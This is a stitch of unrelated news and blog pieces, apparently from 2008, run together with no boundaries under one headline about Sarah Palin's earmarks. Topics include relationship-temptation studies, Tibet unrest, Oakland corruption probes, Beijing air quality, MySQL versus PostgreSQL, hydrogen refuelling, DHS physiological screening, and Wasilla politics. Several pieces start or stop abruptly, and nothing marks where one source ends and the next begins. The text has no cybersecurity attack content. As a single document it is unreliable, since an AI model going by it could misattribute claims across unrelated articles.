Palin on Earmarks : ‘ We Did Well !!!’
Created : September 03 , 2008 19:42 | Last updated : July 31 , 2020 00:00
Digging through Wasilla ’s municipal records is a lesson in the very essence of tedium .
You ’ve got pages of proposals to rename streets , assess sewers , build skateboard parks , buy lawnmowers , rent “ pop ” machines , carve snowmobile trails , congratulate high school football teams — the kind of stuff that makes small towns run , but leaves you glad that someone else is running them .
Every once in a while , though , something pops up and grabs your attention .
Take , for example , Wasilla City Council Informational Memorandum 99 - 62 , prepared on June 14 , 1999 .
This little gem outlines some of the state - funded projects that Wasilla City secured that year , including $ 1.2 million for storm water treatment and $ 605,000 for pedestrian pathways .
Then , slapped in the margin , former Mayor Sarah Palin — reformer extraordinaire — scribbled the following message :
FYI
This does not include our nearly one million Dollars from the Feds for our Airport Paving Project .
As Laura pointed out earlier , John McCain did n’t think so .
Indeed ,
The LA Times reported that McCain was criticizing Palin ’s earmarks at the time that his now - running mate was securing them .
It ’s revelations like these that can quickly erode candidates ’ maverick reputations .
In the pursuit of happily - ever - after , the odds seem to be stacked against us .
Men and women reap huge benefits when they stick around with a good partner -- staying happier and healthier , living longer and passing along more genes .
But the sticking - around part is a challenge .
We do n’t get long - term relationship payoffs right away .
And until then -- between the once - upon - a- time and the happily - ever - after -- plenty of temptations can beckon .
Not that it ’s wrong to shop around before settling down .
But there always will be enticing alternative mates -- whether heart - grabbing or merely eye - catching .
So researchers wonder :
With so many attractive alternatives , how do humans manage to maintain relationships at all ?
The brain appears to have some tricks up its neural sleeve .
A new line of research is exploring how automatic psychological mechanisms kick into action when the eye starts to wander , helping resist temptation and strengthening the relationship -- even without us being aware of it .
Here ’s a sample from some recently published experiments ( all on heterosexual men and women in committed monogamous relationships ) that show how our brain keeps us connected to -- and , yes , even happy with -- the old ball and chain .
( Spoiler :
When it comes to relationships , men and women are a bit different . )
Subconscious alarm bells
An early - warning alert system signals threat .
In an experiment published in the Journal of Personality and Social Psychology in July , researchers at McGill University in Montreal asked 150 men and women to imagine chatting with an attractive member of the opposite sex .
For comparison , another 150 imagined boring encounters with people of the same sex .
After the visualizations , all participants played fill - in - the - blank word games designed to reveal subconscious thoughts .
When presented with “ THR_AT , ” for instance , women who ’d thought about hunky men tended to write “ threat . ”
But men more often wrote “ throat . ”
Likewise , given “ LO_AL ” after the hunk visualization , women saw “ loyal , ” but men tended to see “ local . ”
( Men and women who imagined ho - hum encounters answered similarly , so researchers decided the differences were because of imagined flirtation . )
The conclusion ?
The mere thought of an outside flirtation is enough to trigger alarm bells in women ’s brains -- but not so much in men’s .
“ It ’s an amazing outcome , ” says John Lydon , professor of psychology at McGill University and leader of the study .
“ The same things were n’t coming to mind for the men . ”
Extra tolerance
A flirtation can trigger increased niceness toward a partner -- or not .
In this experiment , the McGill researchers upped the ante .
Each participant encountered a live temptation : a good - looking actor of the opposite sex , trained in the art of subtle flirtation ( and pretending to be another participant signed up for the same study ) .
A comparison group included aloof fake subjects who made no conversation .
After interacting with the beautiful actor , participants were then asked to imagine how they would react if their own partner were to act not - so - beautifully -- being late for a date , for instance , or lying about going out with friends .
Men who were paired with the chatty attractive woman were less likely to forgive their girlfriends ’ hypothetical bad behavior ( compared with men paired with the taciturn fake participant ) .
Women , on the other hand , did the opposite :
Those who had interacted with the good - looking man were more likely to be extra forgiving and make excuses for their boyfriends ’ slip - ups .
The conclusion ?
Subconsciously , men saw the flirtatious woman as a good alternative mate and so felt a bit less committed to their girlfriends .
Women , too , saw the friendly guy as an attractive alternative -- but they also saw the threat he posed .
So women tried to strengthen their relationships -- essentially pitching in to do more of the “ heavy lifting ” of relationship upkeep , Lydon says .
Avoidance
Sometimes we mentally push away temptation .
Here the McGill researchers turned to computer games .
They asked 115 men and women to explore an immersive virtual reality and play with the position of images dangling in space : photographs of animals , fruit and attractive people .
Women who had been first primed to think subconsciously about their relationships tended to shove away the images of the handsome men .
The male participants , on the other hand , did n’t push away the good - looking women -- if anything , they pulled them closer .
Women may automatically know how to protect a relationship better than men do , Lydon says .
So the researchers tried to teach men ’s subconsciousness a new trick : planning ahead for temptation .
Studies have shown , for example , that New Year ’s resolutions succeed more often when people first form a plan of behavior for specific situations .
So the researchers had another group of men visualize a scenario involving a cute woman at the bar and a girlfriend gone for the weekend .
Then they had the men complete the following sentence in detail : “ When the girl approaches , I will [ blank ] to protect my relationship . ”
When let loose in a virtual reality building , these trained men tended to avoid certain areas : the rooms with pictures on the wall of pretty women flickering imperceptibly , flashing for only a few thousands of a second -- so fast that only their subconscious would notice .
Untrained men , however , virtually flocked to the flashing - women rooms .
The conclusion ?
Women already know how to distance threats and protect relationships , perhaps because they ’ve been taught to do so by society .
“ Men do n’t have those strategies built in , ” Lydon says , “ but they can be trained . ”
What ’s more , the methods can be automatic .
“ These strategies do n’t require conscious control , ” he says , “ so they can work if you ’re tired or distracted , or even if you ’ve had a drink . ”
Suppression
We can also push down illicit thoughts .
In a set of experiments on 120 men and women , published in Evolution and Human Behavior in March , researchers at UCLA explored how love gives the brain a boost .
Normally , suppressing unwanted thoughts will backfire .
You can force yourself not to think about chocolate cake for a while , but soon your thoughts will be filled with rich delicious desserts even more than usual .
It ’s called the ironic rebound effect , says Gian Gonzaga , first author of the paper and now a senior research scientist at EHarmony , a match - making website .
And psychological theories say suppression should n’t succeed with thoughts of deliciously tempting men and women either .
Yet it does work .
When men and women were induced to experience feelings of love for their partners , they were able to suppress thoughts about attractive members of the opposite sex .
Feeling lust for their partners , on the other hand , did n’t help with the suppression .
What ’s more , love induced a selective memory block .
When shown pictures of attractive members of the opposite sex , the in - love participants later could n’t remember important details -- such as whether the person in the picture had a good body or dreamy eyes .
They could remember irrelevant details , however , such as whether the person was wearing a purple sweater or holding a hot dog , Gonzaga says .
The conclusion ?
The warm - and - fuzzy glow of love makes the unwanted thoughts go away -- either by providing a distraction or by interfering with the coding of the memory .
“ Love seems to cut off being able to remember anything that might threaten the relationship , ” Gonzaga says .
Desire does n’t do this , though .
“ Love helps a person commit , ” he says , “ but desire fuels sexuality , and sexual desire is not about commitment . ”
Inattention
Best of all , we can just not notice temptation .
In another set of experiments of 124 men and women , published in Evolution and Human Behavior in September , Gonzaga and colleagues at Florida State University found that love can induce a sort of “ hottie blindness ” in people .
A computer game measured how quickly participants could tear their eyes away from an image of a good - looking member of the opposite sex .
The quicker the eye dart , the less captivating the image .
Participants who were feeling generally happy tended to linger somewhat on the tantalizing pictures .
But folks feeling strong love for their partners seemed to be repelled by the tempting sight , and their attention skipped away relatively quickly .
And a final vindication for the males :
Love seems to be an especially potent charm for men , since it drove away their attention from the tempting pictures even faster than it did for women .
The conclusion ?
Love shapes our attention to members of the opposite sex at a very primitive level .
“ This must be very deeply ingrained in us , ” Gonzaga says , “ because it happens so quickly , and we ca n’t consciously control it . ”
As for the gender difference in all the experiments :
It may come out in the wash .
“ Men and women have different challenges in a relationship , but the long - term gains are powerful for both , ” Gonzaga says .
And both -- whether through innate ability , training or love -- are able to respond to little threats lurking in flirty smiles .
“ The basic idea is that if people understand that their relationship is being threatened , they are going to defend it . ”
THE soaring cost of food and fuel is a concern for the governments of rich and poor countries alike .
Many households in Africa and Asia shell - out more on food and fuel as a share of total spending and so are disproportionately hit by rising prices .
But in some poor countries fuel subsidies help to ease the pain .

1. The Federal Reserve cut interest rates to as low as 1 % so that after inflation we had negative interest rates .
2 . As a result , mortgage rates fell to an all time low .
3 . Low rates caused borrowing and lending to explode , particularly in real estate .
For example , commercial banks more than doubled the amount of real - estate loans they made .
4 . All these low interest loans had to be extended to people with worse credit ratings and this increased the demand for homes and other real - estate assets .
It should not be surprising that home prices skyrocketed .
Click on the link below to the Real Estate Roller Coaster :
Fannie Mae , Freddie Mac , mortgage - backed securities , and credit derivatives were simply the conduit that made all these bad loans and investments seem less risky than they really were .
In this manner the Federal Reserve can fool the market , at least temporarily .
In the end the market always reasserts itself .
And in the seventh year after the fall , the dust and debris of the towers cleared .
And it became plain at last what had been wrought .
For the wreckage begat greed ; and it came to pass that while America ’s young men and women fought , other Americans enriched themselves .
Beguiling the innocent , they did backdate options , and they did package toxic mortgage securities and they did reprice risk on the basis that it no more existed than famine in a fertile land .
Thereby did the masters of the universe prosper , with gold , with silver shekels , with land rich in cattle and fowl , with illegal manservants and maids , with jewels and silk , and with Gulfstream V business jets ; yet the whole land did not prosper with them .
And it came to pass , when the housing bubble burst , that Main Street had to pay for the Wall Street party .
For Bush ruled over the whole nation and so sure was he of his righteousness that he did neglect husbandry .
China today admitted for the first time that anti-government demonstrations had spread to other regions and that soldiers had shot rioters " in self - defence " .
The state - run Xinhua news agency reported recent unrest in Sichuan and Gansu provinces , blaming supporters of the Dalai Lama .
It said Chinese forces had shot and wounded four rioters " in self defence " during unrest in Sichuan last weekend .
China has come under international pressure to act with restraint in Tibet .
The US secretary of state , Condoleezza Rice , was reported to have " strongly urged " her Chinese counterpart , Yang Jiechi , to tread carefully in the region during a 20 - minute phone call .
Rice also pushed Beijing to open talks with the Dalai Lama , Tibet 's exiled spiritual leader .
Yesterday , Gordon Brown said the Chinese premier , Wen Jiabao , had told him he was willing to meet the Dalai Lama if the Tibetan leader ruled out independence and renounced violence - conditions which have already been met .
The Dalai Lama today offered to travel to Beijing for talks on the crisis .
Speaking in Dharamsala , northern India , he was quoted by Reuters as saying : " I [ am ] always ready to meet our Chinese leaders , particularly Hu Jintao . "
Official media also announced arrests following the riots in Lhasa .
Thousands of armed police have flooded into the provinces , and the neighbouring Qinghai province , amid sporadic demonstrations .
Witnesses have also reported what appeared to be large military convoys , up to 2 km long , driving towards Tibet in the last few days .
One said that the men in the convoys were armed with automatic machine guns and had riot shields .
Markings and registration plates were removed , but the vehicles appeared to be those normally used by the People 's Liberation Army rather than paramilitary police .
The increasing concentration of security forces came as officials in Lhasa began to parade those held in custody over the disturbances .
The Tibet Daily reported that 24 people had been arrested for endangering state security and other " grave crimes " connected with the riots .
Officials also issued a wanted list of 12 people caught on security camera footage during the unrest .
They said 170 people had surrendered to police following an announcement that those who did so by Monday night would be treated leniently , while others would face harsh punishment .
Many have been shown on state - controlled Tibet Television , with two men confessing to taking part .
One said he had done things he regretted because he " believed other people 's rumours " , while another said a crowd threatened to burn his house down if he did not join them .
The television station said detainees were remorseful and would help police find other demonstrators .
In one sequence , paramilitary police marched suspects in handcuffs , forcing one man 's head to a table as he signed and fingerprinted an unidentified document at the prosecutors ' office .
Rights groups have voiced concern that the authorities are targeting peaceful protesters as well as rioters , warning that those charged would not receive a fair trial .
" There is every reason to fear for the safety of those recently detained , " Brad Adams , the Asia director at Human Rights Watch , said .
Protests against the government started peacefully in Lhasa a week and a half ago , but erupted into riots and attacks on Han Chinese and Hui Muslims last Friday .
Outside Tibet , demonstrations have included attacks on several government buildings , but there were no independent reports of attacks on individuals or private property .
The government claims 16 died in the unrest in Lhasa - including three protestors who allegedly jumped from buildings while fleeing police - while Tibetan exile groups say the tally is closer to 100 when other provinces are included , mostly because of the crackdown .
Xinhua reported protestors in Gansu and Sichuan burning down shops and attacking schools and hospitals as well as police stations .
Sichuan authorities claimed they had also beaten civilians , police and officials in Aba , known in Tibetan as Ngawa .
There was no mention of allegations from Tibetan exile groups that paramilitaries in Aba had fired on protesters , killing several .
Overseas pro-Tibet groups have released the names of alleged victims and photographs of several corpses , but it has been impossible to confirm their authenticity because reporters are being prevented from travelling to the region despite being legally entitled to do so .
Zhang Yusheng , a spokesman for the government in Gansu , said : " These sabotages were organised and premeditated , and their roots were the Dalai clique , whose ulterior motive was to create unrest , disturb the Beijing Olympics , destroy the peace and stability and separate the country . "
There were claims today that several thousand monks and laypeople were protesting in Zeku county , Huangnan , Qinghai .
In a substantial diminution of rhetoric they were said to be calling not for freedom but for " dialogue with the Sacred Dalai Lama , [ and ] the high autonomous administration of Tibet " .
However , officers at Zeku county police station told the Guardian they had nothing to say , while a hotel in the county said it was not aware of disturbances .
The Chinese foreign ministry , meanwhile , said it was " seriously concerned " about a planned meeting between Brown and the Dalai Lama , telling the prime minister not to offer him support .
The Pope also called for dialogue between the two sides , warning : " Violence does not solve problems , but only aggravates them . "
However , Chinese authorities have stepped up attacks on the Dalai Lama , with Tibet 's Communist party chief , Zhang Qingli , telling officials they faced " a life and death battle " with " a wolf in monk 's robes " and his followers .
Yesterday , the spiritual leader , who has denied inciting unrest , urged activists to end a " confrontational " march to Tibet from India , fearing a clash with Chinese troops at the border .
" He made it clear he cannot order them , but he appealed to them to stop , " Tenzin Taklha , his personal secretary , said .
On the old " Star Trek " series , Captain Kirk and his crew never left the ship without their trusty phasers .
One of the coolest things about these weapons was the stun setting .
We 're still a ways off from this futuristic weaponry , but millions of police officers , soldiers and ordinary citizens do carry real - life stun weapons to protect against personal attacks .

We tend to think of electricity as a harmful force to our bodies .
If lightning strikes you or you stick your finger in an electrical outlet , the current can maim or even kill you .
But in smaller doses , electricity is harmless .
In fact , it 's one of the most essential elements in your body .
You need electricity to do just about anything .
When you want to make a sandwich , for example , your brain sends electricity down a nerve cell , toward the muscles in your arm .
The electrical signal tells the nerve cell to release a neurotransmitter , which is a communication chemical , to the muscle cells .
Neurotransmitters tell the muscles to contract or expand in just the right way to put your sandwich together .
When you pick up the sandwich , the sensitive nerve cells in your hand send an electrical message to the brain , telling you what the sandwich feels like .
When you bite into it , your mouth sends signals to your brain telling you how it tastes .
­ In this way , the different parts of your body use electricity to communicate with one another .
This is actually a lot like a telephone system or the Internet .
Specific patterns of electricity are transmitted to deliver recognizable messages .

The FBI is busier than you might think these days in places you might not expect - city halls across America .
There , agents are working to root out corruption in addition to probing state officials such as state Sen.
Don Perata of Oakland .
According to its
Web site , the FBI has elevated public corruption to No. 4 on the agency 's Top 10 List of crimes - behind terrorism , espionage and cyber crimes .
In April , the agency reported more than 2,500 active investigations and the convictions of more than 18,000 public officials since 2003 .
The number of investigators in the agency 's public corruption unit nearly doubled in size during the same period .
And while it is FBI policy not to comment on an ongoing investigation , Oakland residents have to believe , as I do , that a few eyebrows in the agency 's public corruption unit in the Bay Area must be raised over recent developments in Oakland 's City Hall .
City Administrator Deborah Edgerly 's firing three weeks ago - after police began investigating whether she tipped off her nephew , a city parking - meter repairman , to a police investigation before he and 50 other alleged members of a violent gang were arrested - had to have been a red flag .
Then came revelations , reported in this column , that Edgerly 's kids got summer jobs with the city three years ago and were paid even when they did n't work , according to a report by a whistle - blowing former city controller .
" Common sense suggests that any time there is money and power involved in any situation , any organization or government , there is always the potential for corruption , " Joseph Schadler , an FBI agent in the bureau 's San Francisco office , told me Monday .
" We are arguably the only ( law enforcement ) agency in a position to investigate public corruption .
" It 's much easier for the federal government to investigate criminal behavior when it comes to state , local and county officials because we have no entrenched interest .
All we do is investigate , and that puts us in a unique position . "
In recent years , federal law enforcement authorities have kept an eye on Oakland City Hall , including the case against a politically connected tailor charged with trying to extort money from a bidder for a city contract ( he later pleaded guilty to perjury ) , while pursuing a long - term investigation of Perata .
Do n't let the palm trees fool you : Oakland can go scandal for scandal with the some of the most hapless cities in the nation , including Detroit - where " the felony indictments have started to flow , and the feds have joined the fun , " Detroit News columnist Daniel Howes wrote last week .
Among the indicted , Detroit Mayor Kwame Kilpatrick faces eight counts of perjury for his testimony to a grand jury about a romantic affair with a staff member and for allegedly steering public contracts to his father .
And Detroit City Council member Sheila Cockrell confirmed that the feds have subpoenaed her records as part of two council - approved deals under investigation by the FBI .
While elected officials in Detroit chose to argue instead of vote on a measure to help balance the city 's budget , Oakland city officials , almost simultaneously , announced that Edgerly may have understated the city 's budget deficit by $ 30 million .
Perata has been the focus of an FBI probe for the last four years .
Among other things , Perata is under investigation for his role in the hiring of a Washington lobbyist to get funding for a road to the Oakland airport to aid longtime Perata contributor Ron Cowan , The Chronicle reported Monday .
Perata , who is termed out of the state Legislature at the end of the year , has been considered the leading successor to Oakland Mayor Ron Dellums in two years .
It 's obvious to anyone watching the circus tent collapse around Oakland City Hall that the city 's internal checks and balances - as well as the elected members of the Oakland City Council - are n't up to the task .
In all the scrambling to come up with reform packages from the City Council and the city attorney 's office , the most glaringly obvious problem is the city 's inability to enforce the laws already on the books .
There are anti-nepotism rules in the City Charter that , if enforced , provide guidance about hiring family members and fiduciary rules in place to regulate how public funds are handled .
But with no strong , knowledgeable leadership in the mayor 's office or a unified council willing to stand up for its own ethics policies , Oakland residents are never going to know the breadth of the problems in our government .
If federal law enforcement authorities believed there was ample evidence to investigate elected officials in Detroit , Newark , N.J. , and contractors and guards at the Shelby County Juvenile Detention Center in Tennessee , Oakland 's city " government should be on the agency 's to - do list .

Normal in other capital cities , the unusual clarity of the Beijing air this month has some citizens wondering how long it can last once the Olympics are over and extraordinary measures ease .
More than half the cars were ordered off the roads and the worst polluting plants shut for hundreds of kilometers from late July to mid-September , to ensure blue skies for the Olympics and Paralympic Games .
After some initial murky mugginess , the measures worked and air pollutants have dropped measurably .
But will grey smoggy skies return with the cars ?
“ We can breathe much better .
These restrictions show the difference the cars make , ” said Wang Weihua , a taxi driver .
“ It will get worse once they are back on the road , but it could still be better than it was , because of the environmental measures taken regarding the factories . ”
Environmental officials have promised that some of the gains this month will be continued into the future , with plans to monitor ozone levels and the finest particulate matter .
New measures would reduce auto emissions , coal pollution and construction site dust , Du Shaozhong , deputy director of the Beijing Environmental Protection Bureau , said on Tuesday .
“ My feeling is that if they can just keep the current measures , that ’s OK .
For our lives , they work , ” said Zhang Zhizhou , 28 , a technology worker who commutes to work on the subway from the Beijing suburbs , adding that enough money has been spent on the issue already .
“ Pollution control measures are already pretty good , I mean the traffic and air pollution restrictions ...
Now Beijing has a lot of parks , and the level of investment is high . ”
The Olympic experience shows that future pollution measures in Beijing will have to include factory pollution , rather than primarily addressing car exhaust as Los Angeles did , said Deborah Seligsohn , of World Resources Institute .
Alternate day rules , when cars can only be driven on even or odd days depending on their license plate number , should still apply for Beijing even after the Olympics , wrote a blogger named “ Buyoobuyoo ” .
“ Beijing should be a city where people can enjoy the sunshine and blue sky , instead of living in the dust . ”
1 - Indexing SupportMySQL cannot utilize more than one index per query .
I believe this is worth repeating : MySQL CANNOT UTILIZE MORE THAN ONE INDEX PER QUERY .
Wait till your tables get large enough and this will surely hit you .
OTOH PostgreSQL can use multiple indices per query which come real handy .
2 - Full Text Indexing SupportMySQL can do full text indexing on MyISAM tables only , those working with InnoDB tables are out if luck .
PostgreSQL has very advanced full text indexing capabilities wich enable you to control the tiniest details down to the stemming strategy .
3 - Asynchronous InterfaceMySQL drivers are very unfriendly to the Ruby interpreter .
Once a command is issued they take over until they come back with results .
PostgreSQL sports a completely asynchronous interface where you can send queries to the database and then tend to other matters while the query is being processed by the server .
The good news is that an Async ActiveRecord adapter for MySQL is being developed right now , as part of the rapidly growing NeverBlock library .
4 - Ruby Threading AwarePostgreSQL dirvers enable the Ruby thread scheduler while IO requests are being processed ( a nice side effect of the async interface ) .
Which makes it much better suited for multithreaded Rails apps .
5 - Multistatements
Per QueryBoth MySQL and PostgreSQL support sending multiple statements separated by semi colons at once .
But the returning result will be that of the last statement in the group .
Now did you know that by using the async interface you can send multiple queries at once and then get back the results , one by one ?
One of the coolest features of the coming ActiveRecord ( and Sequel btw ) adapter is it 's support for queuing queries to be consumed by a pool of connections .
A trick we are contemplating working on is to group consequent selects together and send them in a single request to PostgreSQL and then later extract the results associated with each one of them .
This is still very theoretical but should be verified soon .
Now that the 0b101 reasons are told I rest my case .
FOR IMMEDIATE RELEASE
St. Paul , Minnesota — August 26 , 2008 — Ramsey County Court held a hearing on whether free speech rights should exist in certain areas surrounding the RNC next week .
Impeach for Peace with the help of the ACLU was suing the St. Paul City Council and Police for eliminating the free speech rights of RNC demonstrators in areas around the RNC without giving specific legitimate reasons regarding security or safety concerns .
Impeach for Peace also accuses St. Paul of failing to engage in due process as required by the Minnesota State Constitution because they did not allow for public discussion prior to making many of their decisions .
Today , arguments were heard in front of Chief Judge Kathleen Gearin .
Impeach for Peace and other litigants were seeking to add portions of Seventh Street near the RNC to the areas allowing free speech .
The City of St. Paul maintained that Seventh Street was crucial for convention bus traffic and emergency vehicles .
However , the City failed to give specific reasons why they felt Seventh Street was necessary , given that the majority of the streets around the RNC will be blocked off for convention and emergency traffic only .
The City did mention access to United Hospital but failed to acknowledge that the most direct access to that hospital would not be made via Seventh Street , but via Smith Ave .
The ACLU argued that the free speech areas , which allow sight and sound access to the convention , are too small .
Most of the area designated by the City is either far away from the RNC or in areas blocked by news vans , trees or other obstacles .
The small area , which is in range of the RNC , is shaped in such a way that two fences converge on a single point closest to the RNC .
This will create a safety hazard as protest groups with different messages compete to occupy that single point .
The media coverage of today ’s court hearing by MPR ( Minnesota Public Radio ) was unfortunately biased toward the City ’s case and in no way fairly reflected the actual specifics of the case .
MPR gave airtime to the City ’s lawyers .
The sound bite chosen left the listener with fear about emergency vehicle access , but did not bother to include audio of the ACLU ’s lawyers , who were also interviewed .
Had MPR engaged in a balance report , the ACLU ’s refutation of that claim would have been made clear .
Impeach for Peace believes the Central point to be made in the case is that the freedom of speech as granted by the U.S. Constitution should be assumed , and any restriction thereof necessarily negotiated with the citizens .
In this case , the City of St. Paul unilaterally decided many of the details regarding free speech activities surrounding the RNC requiring citizens to fight to reacquire their constitutional rights .
Unfortunately , in this instance it is already too late damage the City has caused to free speech rights to be completely repaired .
But , hopefully , the judge ’s decision , which is expected at any time , will hold the City accountable for that damage and restore some of the free speech rights lost .

Advertisement A hydrogen refuelling station which could be installed in the home as an alternative to visiting a petrol station has been unveiled .
Users will need a hydrogen - powered car to go with it although the system can also be used for heating and cooking .
Hydrogen has long been touted as an alternative energy source to carbon - hungry fossil fuels .
One of the biggest obstacles to wider adoption of fuel - cell vehicles is the lack of hydrogen fuelling stations .
To be used as a fuel , hydrogen must first be produced using another energy source .
While some scientists are hopeful of the fuel uses of hydrogen , many others are sceptical because it is inefficient to produce , expensive to transport and to convert into electricity .
A home refuelling station could provide much needed infrastructure to kick - start a hydrogen - based economy , thinks Sheffield - based ITM Power , the firm behind the system .
Hydrogen fridge ITM has converted a Ford Focus to hydrogen
The hydrogen home refuelling station works via an electrolyser which produces the gas from water and electricity .
An internal combustion generator converts the gas back into electricity to provide power for the home .
ITM Power has set up a showcase hydrogen home in Sheffield , where the gas is used for heating , cooking and to operate a fridge .
In terms of producing hydrogen to power a car , the unit can make enough gas overnight to provide fuel for 25 miles .
The hope is eventually to have higher - pressure refuelling units in public places which would be capable of offering enough hydrogen for cars to travel 100 miles .
Such units would be more expensive as they would require a hydrogen compressor which costs around £ 20,000 .
But ITM thinks its system has the potential to revolutionise the move to more green energy .
" Given the pressing need to reduce our dependence on fossil fuels , especially oil , and to cut CO2 emissions , the future for hydrogen as an alternative means of storing and utilising energy cost - effectively has never been brighter , " said Jim Heathcote , chief executive of ITM .
David Hart , a research fellow at Imperial College , London studying hydrogen energy , questioned the cost involved and how energy efficient it would be .
" The critical element of this is how much it would cost to put such a refuelling station in your home .
The technology is very plausible but there are some issues about public acceptance , " he said .
The fact that the refuelling station uses electricity meant it would not be a much - sought after zero emissions system unless the electricity itself is produced in a more green way , he added .
According to Mr Heathcote , the unit - which is currently only a prototype - could be commercially available as soon as the end of this year .
If they were mass produced he estimates they would initially cost around £ 2000 .
He see the first market for the product as being large companies which use a lot of vehicles such as the Post Office .
But eventually it will become common in homes , he thinks .
He said that the next stage of the firm 's work would be to produce a liquid fuel .
Hydrogen cars Honda unveiled a hydrogen powered car in June
At the launch of the home refuel station , ITM also showed off a hybrid Ford Focus car converted to run on hydrogen .
The car needed three pieces of hardware to make it petrol - free - a hydrogen tank , which cost around £ 3000 , four hydrogen injectors ( about £ 100 each ) and a chip to allow the conversion .
Last month , Japanese car manufacturer Honda began the first commercial production of a zero-emission , hydrogen fuel - cell powered vehicle .
Honda claims the vehicle offers three times better fuel efficiency than a traditional , petrol - powered car and plans to produce 200 of the cars over the next three years .
Prime minister Gordon Brown has said that he wants all new cars sold in Britain by 2020 to be electric or hybrid vehicles producing less than 100 grams of carbon dioxide per kilometre .
But Jon Gibbins , part of the hydrogen energy team at Imperial College , is not convinced that ITM 's hybrid car will be the solution .
" Unless the hydrogen is used in a fuel cell then hydrogen vehicles are very inefficient .
For a conventional engine , perhaps 20 % of the energy in the electricity ends up driving the wheels versus maybe 75 % for an electric vehicle . "
" This seems unlikely to be a sustainable use of the limited supplies of renewable or low - carbon energy , " he said .
HOW A HYDROGEN ( PROTON EXCHANGE ) FUEL CELL WORKS 1 Hydrogen : Constantly pumped in at negative terminal 2 Oxygen : Pumped in at opposite positive terminal 3 Catalyst : Helps electrons break free from hydrogen atoms 4 Membrane : Allows hydrogen ions through but blocks electrons 5 Circuit : Electrons flow through circuit to positive terminal 6 Electrons and hydrogen ions combine with oxygen , forming water

What are these ?
Enlarge Photos by Evan Eile , USA TODAY Projectmanager Bob Burns , right , shows off equipment that that measures heart rate , skin temperature and other data .
UPPER MARLBORO , Md.  A scene from the airport of thefuture : A man 's pulse races as he walks through a checkpoint .
His quickenedheart rate and heavier breathing set off an alarm .
A machine senses his skintemperature jumping .
Screeners move in to questionhim .
Signs of a terrorist ?
Or simply a passenger nervousabout a cross-country flight ?
It may seem Orwellian , but on Thursday , the Homeland Security Department showed off an early version of physiologicalscreeners that could spot terrorists .
The department 's research division isyears from using the machines in an airport or an office building — if they even work at all .
But officials believe the ideacould transform security by doing a bio scan to spot dangerouspeople .
Critics doubt such a system can work .
The idea , they say , subjects innocent travelers to the intrusion of a medical exam .
Thefuturistic machinery works on the same theory as a polygraph , looking for sharpswings in body temperature , pulse and breathing that signal the kind of anxietyexuded by a would - be terrorist or criminal .
Unlike a lie - detector test thatwires subjects to sensors as they answer questions , the " Future AttributeScreening Technology " ( FAST ) scans people as they walk by a set ofcameras .
" We 're picking up things with sensors that can't necessarily bedetected by the human eye , " said Jennifer Martin , a consultant to HomelandSecurity 's Science and Technology division .
The five - year project , in itssecond year , is the department 's latest effort to thwart terrorism by spottingsuspicious people .
The Transportation Security Administration ( TSA ) has trainedmore than 2,000 screeners to observe passengers as they walk through airports , questioning those who seem oddly agitated or nervous .
The system wouldbe portable and fast , said project manager Robert Burns , who envisions machinesthat scan people as they walk into airports , train stations or arenas .
Thoseflagged by the machines would be interviewed in front of cameras that measureminute facial movements for signs they are lying .
Like the TSA 's program , FAST raises reliability questions .
Even if machines accurately spot someonewhose heart rate jumps suddenly , that may signal the agitation of learning aflight is delayed , said Timothy Levine , a Michigan State University expert ondeceptive behavior .
" What determines your heart rate is a whole bunch ofreasons besides hostile intent , " Levine said .
" This is the whole reasonbehavioral profiles do n't work . "
John Verdi , a lawyer at the ElectronicPrivacy Information Center , calls physiological screening a " medical exam " thatthe government has no business conducting .
" This is substantially more invasivethan screening in airports , " Verdi said .
Burns said the measurementswould not be stored and would give a quick read on someone .
Previous research , Burns added , has found that people planning to cause harm act differently fromthe anxious or annoyed .
To pinpoint the physiological reactions thatindicate hostile intent , researchers have set up two lab - like trailers on anequestrian center outside Washington , D.C. Science and Technology recruited 140 local people with newspaper and Internet ads seeking testers in a " securitystudy . "
Each person receives $ 150 .
On Thursday , subjects walked one byone into a trailer with a makeshift checkpoint .
A heat camera measured skintemperature .
A motion camera watched for tiny skin movements to measure heartand breathing rates .
As a screener questioned each tester , five observersin another trailer looked for sharp jumps on the computerized bands thatdisplay the person 's physiological characteristics .
Some subjects wereinstructed in advance to try to cause a disruption when they got past thecheckpoint , and to lie about their intentions when being questioned .
Thosepeople 's physiological responses are being used to create a database ofreactions that signal someone may be planning an attack .
More testing isplanned for the next year .

Senate bill would restrict Bush from secret executive orders RAW STORY
Published : Friday August 1 , 2008
Print This Email This
The President will no longer be able to change published executive orders in secret if a bill introduced to the Senate Thursday becomes law .
Sen . Russ Feingold , shown above , and Sen. Sheldon
Whitehouse sponsored the bill as a response to an unreleased statement from the Justice Department Office of Legal Council that the President can alter or deviate from a previous executive order without public or Congressional knowledge .
Whitehouse quoted the department 's opinion during a speech about the " second - rate piece of legislation " known as the FISA bill , or Foreign Intelligence Surveillance Act .
" There is no constitutional requirement for a President to issue a new Executive order whenever he wishes to depart from the terms of a previous Executive order .
Rather than violate an Executive order , the President has instead modified or waived it . "
This means the President could extend his powers beyond the laws that restrict the executive branch without the public knowing .
In order to disallow the President from doing so , Feingold and Whitehouse created the Executive Order Integrity Act of 2008 .
" No one disputes that a President can withdraw or revise an Executive Order at any time , " Feingold said as he introduced the bill Thursday .
" But abrogating a published Executive order without any public notice works a secret change in the law . "
" Because the published Order stays on the books , it actively misleads Congress and the public as to what the law is , " he said .
Feingold said the new bill would eliminate that problem by requiring a notice of any change within 30 days , though it " does not require the publication of any classified information . "
" On rare occasions , national security can justify elected officials keeping some information secret , " he said , " but it can never justify lying to the American people about what the law is .
Maintaining two different sets of laws , one public and one secret , is just that -- deceiving the American people about what law applies to the government 's conduct . "
Feingold spoke out against the FISA bill earlier this month , trying to convince fellow congressmen that it would make it more difficult to hold the President " accountable . "

In the beginning , it was Sarah vs the big gummint boys
Posted on by Gnomad
This is my first post here , so forgive me if it is n't quite the way it 's supposed to be -here we go .
Wasilla , Alaska , 1996 - a small conservative town was being run by big government liberals .
The mayor at the time was John Stein , a guy who I always thought was out of touch with the average Wasilla voter - but he carried that self - important air about him , reinforced by his cabal , that Wasilla was going to continue along his expansionist ever more restrictive vision of the future and that is just the way it was going to be .
Because we are your betters , that 's why .
What really galvanized those of us outside the city , but just barely outside , was his stated goal to annex everything from Wasilla proper to Trunk road , this was going to fold me into the city limits without much sayso on my part , or my neighbors .
The other part was his idea that Wasilla was going to be a town of small houses - nothing over 35 ' off the ground .
